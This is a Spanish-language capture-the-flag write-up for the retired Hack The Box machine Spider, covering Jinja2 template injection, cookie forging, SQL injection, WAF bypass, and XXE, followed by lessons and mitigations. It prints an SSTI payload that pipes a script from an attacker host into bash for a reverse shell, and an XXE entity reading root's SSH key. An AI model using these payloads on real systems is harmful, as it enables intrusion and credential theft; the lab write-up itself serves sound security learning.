---
machine: Spider
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, flask, ssti, jinja2, sqli, cookie, waf, xxe, lxml, privesc]
---

# Spider — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La web es Flask y la cookie de sesión contiene `username` y `uuid`. Al registrar el usuario `0x{{7*7}}`, el perfil devuelve `49`: hay SSTI de Jinja2. Con `{{config}}` se filtra `SECRET_KEY` y se firman cookies arbitrarias. El campo `uuid` de la cookie llega a una consulta SQL; con sqlmap se extrae el identificador de `chiv` y se entra al panel de administración. Allí hay otra SSTI, ciega y con WAF, que se usa para lanzar una reverse shell como `chiv`. Su clave SSH permite acceder al host; en `localhost:8080` hay un login beta que procesa XML en una cookie con `lxml`, vulnerable a XXE, y permite leer la clave SSH de root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22`: OpenSSH.
- `80`: nginx con una tienda Flask.

```bash
echo '<IP> spider.htb' | sudo tee -a /etc/hosts
```

La cookie de sesión es de Flask y se puede decodificar:

```json
{"cart_items": [], "username": "", "uuid": ""}
```

## Enumeración

El registro acepta un nombre de usuario y lo muestra en el perfil. Se prueba SSTI con `0x{{7*7}}`; el perfil devuelve `0x49`, lo que confirma Jinja2. La inyección está limitada, pero `{{config}}` expone la configuración y la `SECRET_KEY`.

Con la clave se firman cookies de Flask. La cookie contiene un `uuid` que el servidor usa en una consulta SQL; un `'` provoca un error, y sqlmap confirma inyección time-based y UNION.

## Foothold

Se forja una cookie con el `uuid` de `chiv` y se accede al panel de administración. El panel tiene un SSTI adicional, ciego y filtrado por un WAF. Se codifican los caracteres bloqueados y se usa una expresión Jinja2 que importa `os` y ejecuta una petición a un listener propio:

```text
{{request.application.__globals__.__builtins__.__import__('os').popen('curl http://<LHOST>/shell.sh|bash').read()}}
```

La ejecución devuelve una shell como `chiv`. En su home hay una clave SSH privada.

## Movimiento lateral

Con la clave de `chiv` se entra por SSH. El puerto `8080` solo escucha en localhost; se reenvía:

```bash
ssh -i chiv.key chiv@spider.htb -L 8888:localhost:8080
```

El servicio muestra un login beta que construye una cookie XML a partir de los campos del formulario y la procesa con `lxml`.

## Escalada de privilegios

El XML de la cookie es vulnerable a XXE. Se inyecta una entidad externa que lee archivos del sistema y se refleja en la respuesta:

```xml
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///root/.ssh/id_rsa'>]>
```

Con el mismo método se lee `/root/root.txt`. La clave privada de root permite entrar por SSH y completar la máquina.

## Evidencia

- SSTI en el nombre de usuario y `SECRET_KEY` filtrada con `{{config}}`.
- Cookie firmada y SQLi en el `uuid` para obtener el identificador de `chiv`.
- SSTI ciega en el panel y reverse shell como `chiv`.
- Clave SSH de `chiv` y túnel a `localhost:8080`.
- XXE en la cookie XML y clave SSH de root.

## Lecciones aprendidas

- Un nombre de usuario mostrado sin escapar puede ser SSTI.
- `{{config}}` filtra secretos si el entorno de plantillas no está aislado.
- Firmar una cookie no impide manipular su contenido si se conoce la clave.
- Un identificador de sesión usado en SQL permite suplantar usuarios.
- Los WAF se sortean codificando caracteres, no solo con payloads nuevos.
- `lxml` con entidades externas habilitadas es XXE.

## Mitigaciones y detección

- Escapar la salida y usar `SandboxedEnvironment` en Jinja2.
- Guardar `SECRET_KEY` fuera del código y rotarla.
- Parametrizar consultas y no confiar en el `uuid` de la cookie.
- Validar y canonicalizar la entrada antes del WAF; no usarlo como única defensa.
- Deshabilitar entidades externas en `lxml` (`resolve_entities=False`).
- Monitorizar peticiones salientes desde el servidor web y lecturas de claves SSH.

## Referencias

- [0xdf — Spider](https://0xdf.gitlab.io/2021/10/23/htb-spider.html)
- [Hack The Box — Spider](https://app.hackthebox.com/machines/spider)
- [Knowledge — XXE](../../../knowledge/web/xxe.md)
